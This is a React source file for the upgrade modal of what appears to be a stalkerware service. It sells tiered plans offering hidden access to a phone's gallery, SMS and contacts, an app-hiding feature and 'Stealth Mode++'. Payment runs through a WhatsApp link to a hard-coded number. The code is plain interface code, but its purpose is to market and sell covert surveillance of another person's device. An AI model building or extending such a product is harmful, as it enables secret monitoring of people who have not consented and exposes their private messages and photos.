"use client";

interface PlansModalProps {
    isOpen: boolean;
    onClose: () => void;
    currentPlan: 'basic' | 'standard' | 'premium';
    userEmail: string;
    userUuid: string;
}

export default function PlansModal({ isOpen, onClose, currentPlan, userEmail, userUuid }: PlansModalProps) {
    if (!isOpen) return null;

    const generateWhatsAppLink = (planName: string, price: string) => {
        const message = `Hello, I want to upgrade to ${planName} Plan (${price}).\n\nMy Email: ${userEmail}\nMy UUID: ${userUuid}`;
        return `https://wa.me/923177407478?text=${encodeURIComponent(message)}`;
    };

    const plans = [
        {
            id: 'basic',
            name: 'Basic',
            price: 'Free',
            icon: '🆓',
            gradient: 'from-gray-700 to-gray-900',
            border: 'border-white/10',
            features: [
                '10, 20, 50 Items Sync',
                'Basic Gallery Access',
                'No ZIP Download',
                'Limited Features'
            ],
            current: currentPlan === 'basic'
        },
        {
            id: 'standard',
            name: 'Standard',
            price: '$5',
            icon: '⭐',
            gradient: 'from-blue-600/20 to-purple-600/20',
            border: 'border-blue-500/30',
            glow: 'shadow-blue-500/10',
            features: [
                '50, 100, 200 Items Sync',
                'SMS & Contacts Access',
                'Flashlight & Vibration',
                'App Hiding Feature',
                'Priority Fast Sync'
            ],
            current: currentPlan === 'standard'
        },
        {
            id: 'premium',
            name: 'Premium',
            price: '$10',
            icon: '👑',
            gradient: 'from-yellow-500/20 to-orange-600/20',
            border: 'border-yellow-500/50',
            glow: 'shadow-yellow-500/20',
            features: [
                'ALL Items Sync (Unlimited)',
                'ZIP Download (One Click)',
                'Cloud Backup Features',
                'Stealth Mode++',
                'All Standard Features',
                '24/7 Priority Support'
            ],
            popular: true,
            current: currentPlan === 'premium'
        }
    ];

    return (
        <div className="fixed inset-0 z-[70] flex items-center justify-center bg-black/90 backdrop-blur-xl animate-fadeIn p-4">
            <div className="relative w-full max-w-6xl max-h-[95vh] overflow-y-auto bg-[#050505] border border-white/10 rounded-[32px] shadow-2xl animate-scaleUp scrollbar-hide">

                {/* Background Blobs */}
                <div className="absolute top-0 left-0 w-96 h-96 bg-purple-500/10 blur-[100px] rounded-full pointer-events-none" />
                <div className="absolute bottom-0 right-0 w-96 h-96 bg-blue-500/10 blur-[100px] rounded-full pointer-events-none" />

                {/* Close Button */}
                <button
                    onClick={onClose}
                    className="absolute top-6 right-6 p-3 bg-white/5 rounded-full hover:bg-white/10 transition-colors z-20 group"
                >
                    <svg className="w-6 h-6 text-white/60 group-hover:text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
                </button>

                <div className="p-8 md:p-12 text-center relative z-10">
                    <div className="inline-block px-4 py-1.5 rounded-full bg-gradient-to-r from-purple-500/20 to-blue-500/20 border border-purple-500/30 text-purple-300 text-sm font-semibold mb-6">
                        ✨ UPGRADE YOUR EXPERIENCE
                    </div>

                    <h2 className="text-4xl md:text-5xl font-bold mb-6 bg-clip-text text-transparent bg-gradient-to-br from-white via-white to-white/40">
                        Choose Your Power
                    </h2>
                    <p className="text-white/50 mb-16 max-w-2xl mx-auto text-lg leading-relaxed">
                        Unlock advanced surveillance capabilities, unlimited downloads, and premium stealth features.
                    </p>

                    <div className="grid md:grid-cols-3 gap-8">
                        {plans.map((plan) => (
                            <div
                                key={plan.id}
                                className={`relative rounded-3xl p-1 flex flex-col transition-all duration-500 hover:-translate-y-2 ${plan.popular ? 'shadow-2xl shadow-yellow-500/10' : ''}`}
                            >
                                {/* Active Plan Indicator - Replaces the whole card border/glow if desired, but here we integrate it nicely */}
                                {plan.current && (
                                    <div className="absolute -top-4 left-1/2 -translate-x-1/2 bg-green-500 text-black font-bold px-4 py-1 rounded-full text-sm z-30 shadow-lg shadow-green-500/20 flex items-center gap-2">
                                        <div className="w-2 h-2 bg-black rounded-full animate-pulse" />
                                        ACTIVE PLAN
                                    </div>
                                )}

                                {/* Card Border Gradient */}
                                <div className={`absolute inset-0 rounded-3xl bg-gradient-to-b ${plan.id === 'premium' ? 'from-yellow-500/50 to-orange-600/10' : plan.id === 'standard' ? 'from-blue-500/50 to-purple-600/10' : 'from-white/10 to-transparent'} pointer-events-none`} />

                                <div className="relative h-full bg-[#0a0a0a] rounded-[28px] p-6 md:p-8 flex flex-col items-center overflow-hidden">
                                    {/* Card Gradient Bg */}
                                    <div className={`absolute inset-0 bg-gradient-to-br ${plan.gradient} opacity-10`} />

                                    {plan.popular && (
                                        <div className="absolute top-6 right-6 text-yellow-400">
                                            <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg>
                                        </div>
                                    )}

                                    <div className="w-20 h-20 rounded-2xl bg-white/5 flex items-center justify-center text-4xl mb-6 shadow-inner ring-1 ring-white/10">
                                        {plan.icon}
                                    </div>

                                    <h3 className="text-2xl font-bold mb-2">{plan.name}</h3>
                                    <div className="flex items-baseline gap-1 mb-8">
                                        <span className="text-4xl font-bold bg-clip-text text-transparent bg-gradient-to-b from-white to-white/60">{plan.price}</span>
                                        <span className="text-sm text-white/40">/lifetime</span>
                                    </div>

                                    <div className="w-full space-y-4 mb-8 flex-1">
                                        {plan.features.map((feature, i) => (
                                            <div key={i} className="flex items-center gap-3 text-sm text-white/80">
                                                <div className={`w-5 h-5 rounded-full flex items-center justify-center flex-shrink-0 ${plan.current ? 'bg-green-500/20 text-green-400' :
                                                        plan.id === 'premium' ? 'bg-yellow-500/20 text-yellow-400' :
                                                            plan.id === 'standard' ? 'bg-blue-500/20 text-blue-400' : 'bg-white/10 text-white/40'
                                                    }`}>
                                                    <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M5 13l4 4L19 7"></path></svg>
                                                </div>
                                                {feature}
                                            </div>
                                        ))}
                                    </div>

                                    <div className="w-full mt-auto">
                                        {plan.current ? (
                                            <div className="w-full py-4 rounded-xl bg-green-500/10 border border-green-500/20 text-green-400 font-bold flex items-center justify-center gap-2">
                                                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                                                Active Plan
                                            </div>
                                        ) : plan.id === 'basic' ? (
                                            <div className="w-full py-4 rounded-xl bg-white/5 text-white/30 font-semibold border border-white/5 flex items-center justify-center">
                                                Included Free
                                            </div>
                                        ) : (
                                            <a
                                                href={generateWhatsAppLink(plan.name, plan.price)}
                                                target="_blank"
                                                rel="noopener noreferrer"
                                                className={`group relative w-full overflow-hidden rounded-xl py-4 font-bold transition-all hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center ${plan.id === 'premium'
                                                        ? 'bg-gradient-to-r from-yellow-500 to-orange-600 text-black shadow-lg shadow-orange-500/20'
                                                        : 'bg-gradient-to-r from-blue-600 to-purple-600 text-white shadow-lg shadow-purple-500/20'
                                                    }`}
                                            >
                                                <div className="absolute inset-0 bg-white/20 translate-y-full group-hover:translate-y-0 transition-transform duration-300 pointer-events-none" />
                                                <span className="relative flex items-center gap-2">
                                                    Upgrade Now
                                                    <svg className="w-4 h-4 group-hover:translate-x-1 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 8l4 4m0 0l-4 4m4-4H3"></path></svg>
                                                </span>
                                            </a>
                                        )}
                                    </div>
                                </div>
                            </div>
                        ))}
                    </div>
                </div>
            </div>
        </div>
    );
}
